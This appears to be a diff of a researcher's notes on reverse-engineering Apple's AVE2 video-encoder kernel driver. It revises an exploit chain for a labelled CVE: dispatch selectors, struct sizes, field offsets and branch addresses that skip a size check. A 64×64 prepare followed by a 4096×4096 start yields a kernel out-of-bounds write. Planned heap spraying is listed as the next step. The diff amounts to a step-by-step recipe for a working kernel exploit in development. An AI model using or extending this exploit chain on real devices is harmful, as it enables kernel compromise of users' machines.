@@ -27,17 +27,19 @@
 
 ## IOKit User Client Dispatch Table (2026-11-04)
 
-**Service**: `AppleAVE2UserClient`  
+**Service**: `AppleAVE2Driver` (IOServiceMatching name; user client = `AppleAVE2UserClient`)  
 **Dispatch table VA**: `0xfffffff007dc1840` (in `__DATA_CONST.__const`)  
 **Table format**: `IOExternalMethodDispatch` — 24 bytes/entry: `[action:8][scalar_in:4][struct_in:4][scalar_out:4][struct_out:4]`
 
-| Sel | Action VA              | struct_in   | struct_out  | Function / Notes             |
-|-----|------------------------|-------------|-------------|------------------------------|
-|  0  | 0xfffffff0086401ec     | 0x38        | 0x20        | **IO_Open** — open encode session |
-|  1  | 0xfffffff008640aa8     | 0x1a0a0     | 0x20        | **IO_Close** — close session |
-|  2  | 0xfffffff00864157c     | 0x1a0b0     | 0x150       | **IO_Config** — `sub_8644574` (outer), `sub_8640d9c` (CheckParam) · "AVE_UCCmd_CheckParam_Config" |
-|  3  | 0xfffffff008642094     | 0x30        | 0x20        | **IO_Prepare** — allocates kernel buffers; sets encoder_state[0x1838/183c] = w/h |
-|  4  | 0xfffffff0086428ac     | 0x30        | 0x20        | **IO_Start** — PATH B (VULNERABLE) → sub_8645b88 → sub_85249dc → sub_851ea24 → CheckGGMInfo bypass |
+Note on struct sizes: IOKit dispatch-level `struct_in` is the MINIMUM enforced by the framework. The actual handler validates the full size internally. Mac binary analysis found actual required sizes for Prepare/Start (0x1a0a0 / 0x1a0b0).
+
+| Sel | Action VA              | struct_in (dispatch min) | struct_in (actual)  | struct_out  | Function / Notes             |
+|-----|------------------------|--------------------------|---------------------|-------------|------------------------------|
+|  0  | 0xfffffff0086401ec     | 0x38                     | 0x38                | 0x20        | **IO_Open** — open encode session |
+|  1  | 0xfffffff008640aa8     | 0x1a0a0                  | 0x1a0a0             | 0x20        | **IO_Close** — close session |
+|  2  | 0xfffffff00864157c     | 0x1a0b0                  | 0x1a0b0             | 0x150       | **IO_Config** — `sub_8644574` (outer), `sub_8640d9c` (CheckParam) · NOT NEEDED (see below) |
+|  3  | 0xfffffff008642094     | 0x30                     | **0x1a0a0**         | 0x20        | **IO_Prepare** — `S_AVE_UCInParam_Prepare`; allocates kernel buffers |
+|  4  | 0xfffffff0086428ac     | 0x30                     | **0x1a0b0**         | 0x20        | **IO_Start** — `S_AVE_UCInParam_Start`; VULNERABLE → CheckGGMInfo bypass |
 |  5  | 0xfffffff0086430c4     | 0x30        | 0x20        | IO_Stop  |
 |  6  | 0xfffffff0086438dc     | 0x30        | 0x20        | IO_Process |
 |  7  | 0xfffffff0086440f4     | 0x30        | 0x20        | IO_Complete |
@@ -250,6 +252,8 @@ session_obj + 0x340
 Confirmed by: `add x5, x20, #0x340` at 0xfffffff008645fdc (call site inside `sub_8645b88`).
 x5 = arg5 to `sub_85249dc` → saved as x27 → passed as x2 to `sub_851ea24` → x22 in `sub_851e204` → arg3 to `CheckGGMInfo`.
 
+**KEY FINDING (Mac session, 2026-11-04)**: `Config[session_obj+0x340+0x2ec0]` is **NEVER WRITTEN** by any observable path. The session object is zero-initialized → `Config[0x2ec0] = 0` by default → bypass is **ALWAYS ACTIVE**. No IO_Config call is required to arm the bypass.
+
 **IO_Config input struct mapping (1:1 to config struct offsets):**
 - `input[0x0028]` = `iNotificationFunc` — must be non-null (CheckParam_Config)
 - `input[0x0030]` = `iNotificationParam` — must be non-null
@@ -257,7 +261,16 @@ x5 = arg5 to `sub_85249dc` → saved as x27 → passed as x2 to `sub_851ea24` �
 - `input[0x0248]` = `iNumOfFrame_B` — alternative PATH B trigger (set >3)
 - `input[0x0a58]` = `ui32Width` — frame width for START
 - `input[0x0a5c]` = `ui32Height` — frame height for START
-- `input[0x2ec0]` = `mode_flag` — **set to 0 to activate bypass** (any value ≠ 1)
+- `input[0x2ec0]` = `mode_flag` — **always 0 (default) = bypass active**; would need explicit IO_Config write of 1 to disable
+
+**IO_Prepare/IO_Start input struct (S_AVE_UCInParam_Prepare / S_AVE_UCInParam_Start):**
+Field layout (from first-24-bytes load pattern at handler entry, 0x8644c80):
+- `+0x00` = `uint32 ui32Width`
+- `+0x04` = `uint32 ui32Height`
+- `+0x08` = `uint32 ui32PixelFmt`
+- `+0x0C` = `uint32 ui32Codec` (e.g. H.264 = 0x61766331 'avc1')
+- `+0x10` = `uint64 flags/reserved`
+Alternate possibility: width/height after a common header at +0x28, +0x30, or +0x40 (if first run validation fails, try these).
 
 **IO_Config handler:** `sub_8644574` (outer wrapper, references "AppleAVE2UserClient"/"Config")  
 calls → `sub_8640d9c` (CheckParam_Config, validates iNotificationFunc etc.)  
@@ -265,27 +278,25 @@ then → stores fields to session_obj from x20 at [+0x100,0x108,0x110...].
 
 ---
 
-### Exploit chain (CVE-2026-112689) — CONFIRMED:
+### Exploit chain (CVE-2026-112689) — SIMPLIFIED (no IO_Config needed):
+
+Config[0x2ec0] defaults to 0 (bypass always active). The minimum viable chain:
 
 ```
-sel=0  IO_Open(0x38 input):    Open HEVC encode session
-sel=2  IO_Config(0x1a0b0 input):
-         width=64, height=64, iLAFrameCnt=21, mode_flag=0
-         → config[0x2ec0]=0 (bypass armed), config[0xa58]=64, config[0x1c8]=21
-sel=3  IO_Prepare(0x30 input):  Allocates kernel buffer for 64×64
-         → encoder_state[0x1838]=64, encoder_state[0x183c]=64
-sel=2  IO_Config(0x1a0b0 input): TOCTOU trigger
-         width=4096, height=4096, iLAFrameCnt=21, mode_flag=0
-         → config[0xa58]=4096 (now mismatches prepared 64)
-sel=4  IO_Start(0x30 input):   PATH B (iLAFrameCnt=21 → look-ahead path)
-         → sub_8645b88 → sub_85249dc → sub_851ea24 → sub_851e204
-         → AVE_Client_CheckGGMInfo (0x851dd2c)
-         → tbnz bypass: bit0(arg2)=0 → continue to mode_flag check
-         → ldr w8, [x22, #0x2ec0] = 0
-         → cmp w8, #1 → b.ne: mode_flag=0 ≠ 1 → BYPASS ACTIVATED
-         → mismatch check SKIPPED (encoder_state[0x1838]=64 ≠ config[0xa58]=4096)
+sel=0  IO_Open(~0x200 bytes):   Open HEVC encode session
+sel=3  IO_Prepare(0x1a0a0 bytes):
+         width=64, height=64, codec='avc1'
+         → handler allocates small buffer for 64×64 → encoder_state[0x1838]=64
+sel=4  IO_Start(0x1a0b0 bytes):
+         width=4096, height=4096, codec='avc1'
+         → Config[0x2ec0]=0 (default) → bypass at 0x851df84 fires
+         → mismatch check SKIPPED (encoder_state[0x1838]=64 ≠ start width=4096)
          → Encode processes 4096×4096 frame into 64×64 kalloc buffer → OOB WRITE
 ```
+
+**Two unknowns that will be resolved by first run:**
+1. Exact field offset for width/height in Prepare/Start input struct (0x00 or 0x28/0x40 if header present)
+2. Entitlement: may need `com.apple.private.coremedia.allow-avencoder-xpc` if IOServiceOpen returns kIOReturnNotPermitted
 
 **PoC script**: `kerneldiff/ave2_poc.py` (ResearchHost job — close PocketCode before running)
 
@@ -293,8 +304,9 @@ sel=4  IO_Start(0x30 input):   PATH B (iLAFrameCnt=21 → look-ahead path)
 
 ## Notes / Open Questions
 
-- **ANSWERED**: Sel 4 = IO_Start (confirmed by Mac session, PATH B confirmed)
-- **ANSWERED**: PATH B = IO_Start → sub_8645b88 → sub_85249dc → sub_851ea24 (bypasses sub_8523fb0)
-- **ANSWERED**: Two IO_Config calls (small then large) trigger the TOCTOU
+- **ANSWERED**: Sel 4 = IO_Start, bypass fires because Config[0x2ec0]=0 by default
+- **ANSWERED**: No IO_Config needed — zero-initialized session object = bypass always active
+- **ANSWERED**: Actual struct sizes: Prepare=0x1a0a0, Start=0x1a0b0 (not 0x30 dispatch minimum)
 - Panic log from first PoC run will reveal: kalloc zone, adjacent object type, fault PC
+- If IO_Prepare succeeds but IO_Start returns error: check if width/height offset needs adjustment
 - After confirming OOB: heap spray the adjacent kalloc zone to target a specific object type
